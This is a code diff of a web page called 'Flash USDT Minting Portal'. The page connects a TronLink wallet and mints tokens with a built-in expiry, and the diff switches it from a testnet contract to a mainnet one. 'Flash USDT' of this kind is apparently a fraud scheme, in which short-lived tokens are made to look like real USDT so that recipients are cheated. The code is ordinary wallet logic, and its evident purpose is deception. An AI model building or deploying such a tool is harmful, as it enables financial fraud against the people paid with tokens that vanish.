@@ -5,7 +5,7 @@
   <title>Flash USDT Minting Portal</title>
 </head>
 <body>
-  <h2>Flash USDT Minting Portal</h2>
+  <h2>Flash USDT Minting Portal (Mainnet)</h2>
 
   <button onclick="connectWallet()">Connect Wallet</button>
   <p id="walletAddress">Wallet not connected</p>
@@ -17,42 +17,7 @@
   <p id="status"></p>
 
   <script>
-    const CONTRACT_ADDRESS = "TEc6bw2FczmF3kJgvM39M98umP18WeU4Ad"; // Nile Testnet
-
-    const CONTRACT_ABI = [
-      {
-        "inputs": [
-          { "internalType": "address", "name": "to", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" },
-          { "internalType": "uint256", "name": "expiry", "type": "uint256" }
-        ],
-        "name": "mintWithExpiry",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "name",
-        "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-        "stateMutability": "view",
-        "type": "function"
-      }
-    ];
+    const CONTRACT_ADDRESS = "TMAJLJwYBQczCRee3Nn4QDLSEHcBg4zXkY"; // Mainnet verified contract
 
     let tronWeb;
     let currentAddress;
@@ -66,7 +31,7 @@
           currentAddress = tronWeb.defaultAddress.base58;
           document.getElementById("walletAddress").textContent = "Connected: " + currentAddress;
 
-          contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+          contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
           document.getElementById("status").textContent = "✅ Wallet connected & contract loaded";
         } else {
           alert("TronLink not detected. Please install TronLink extension.");
@@ -82,16 +47,14 @@
         return;
       }
 
-      const amountRaw = document.getElementById("amount").value;
-      const expiryRaw = document.getElementById("expiry").value;
+      const amount = parseInt(document.getElementById("amount").value);
+      const expirySeconds = parseInt(document.getElementById("expiry").value);
 
-      if (!amountRaw || !expiryRaw) {
-        document.getElementById("status").textContent = "❌ Please enter both amount and expiry.";
+      if (isNaN(amount) || isNaN(expirySeconds)) {
+        document.getElementById("status").textContent = "❌ Enter valid amount and expiry.";
         return;
       }
 
-      const amount = parseInt(amountRaw);
-      const expirySeconds = parseInt(expiryRaw);
       const expiryTimestamp = Math.floor(Date.now() / 1000) + expirySeconds;
 
       try {
